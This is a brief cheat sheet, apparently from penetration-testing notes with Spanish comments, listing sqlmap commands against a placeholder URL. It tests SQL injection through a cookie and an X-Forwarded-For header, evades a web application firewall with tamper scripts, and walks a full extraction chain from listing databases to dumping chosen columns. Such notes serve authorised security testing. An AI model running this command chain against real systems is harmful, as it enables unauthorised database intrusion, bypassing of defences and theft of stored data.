sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# evadir WAF
sqlmap -u "http://t/p.php?id=1" --tamper=space2comment,between --batch
# cadena de extracción de datos
sqlmap ... --dbs
sqlmap ... -D db --tables
sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```
